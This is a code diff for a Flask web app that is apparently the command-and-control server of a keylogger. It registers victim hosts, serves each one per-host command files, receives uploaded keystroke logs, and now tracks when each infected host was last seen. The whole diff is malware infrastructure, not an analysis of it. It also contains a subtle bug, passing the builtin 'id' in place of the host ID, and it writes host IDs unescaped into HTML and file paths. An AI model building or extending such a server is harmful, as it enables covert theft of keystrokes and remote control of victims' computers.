@@ -2,6 +2,9 @@ from flask import Flask, render_template, request
 import os
 import re
 from urllib.parse import unquote
+import json
+from datetime import datetime
+from filelock import FileLock
 
 app = Flask(__name__)
 
@@ -19,6 +22,31 @@ def decode_keystrokes(data):
 
     return data
 
+def update_last_seen(host_id):
+    current_dir = os.getcwd()
+    json_path = f"{current_dir}/last_seen.json"
+    lock_path = json_path + ".lock"
+
+    try:
+        with FileLock(lock_path):
+            if os.path.isfile(json_path):
+                with open(json_path, "r") as f:
+                    try:
+                        data = json.load(f)
+                    except json.JSONDecodeError:
+                        print("Corrupt last_seen.json. Resetting.")
+                        data = {}
+            else:
+                data = {}
+
+            data[host_id] = datetime.utcnow().isoformat()
+
+            with open(json_path, "w") as f:
+                json.dump(data, f)
+    except Exception as e:
+        print(f"Failed to update last seen: {e}")
+
+
 @app.route('/')
 def hello_world():
     return render_template("test.html")
@@ -27,13 +55,31 @@ def hello_world():
 @app.route('/clients', methods=['GET'])
 def get_clients():
     current_dir = os.getcwd()
+    hosts_path = f"{current_dir}/hosts.txt"
+    seen_path = f"{current_dir}/last_seen.json"
+
     try:
-        # Return all hosts in the hosts.txt file
-        with open(f"{current_dir}/hosts.txt", "r") as f:
-            data = f.read()
-            return data.replace("\n", "<br>")
+        with open(hosts_path, "r") as f:
+            hosts = f.read().splitlines()
     except:
-        return "Unable to grab client lists. Please try again later."
+        return "Unable to grab client list. Please try again later."
+
+    try:
+        if os.path.isfile(seen_path):
+            with open(seen_path, "r") as f:
+                last_seen = json.load(f)
+        else:
+            last_seen = {}
+    except:
+        last_seen = {}
+
+    output = ""
+    for host in hosts:
+        seen_time = last_seen.get(host, "Unknown")
+        log_link = f"/logs?id={host}"
+        output += f"Host: {host} | Last seen: {seen_time} | <a href='{log_link}'>View Logs</a><br>"
+
+    return output
 
 @app.route('/logs', methods=['GET'])
 def get_logs():
@@ -70,6 +116,7 @@ def set_commands():
 @app.route('/register', methods=['GET'])
 def register():
     host_id = request.args["id"]
+    update_last_seen(host_id)
     current_dir = os.getcwd()
     try:
         # We only register if client does not yet have a file
@@ -89,6 +136,7 @@ def register():
 @app.route('/command', methods=['GET'])
 def get_command():
     id = request.args["id"]
+    update_last_seen(id)
     current_dir = os.getcwd()
     file_name = f"{current_dir}/{id}-C2.txt"
     try:
@@ -105,6 +153,7 @@ def get_command():
 def upload_data():
     print("Logs incoming!")
     host_id = request.args["id"]
+    update_last_seen(id)
     host_data = request.args["data"]
     current_dir = os.getcwd()
     try:
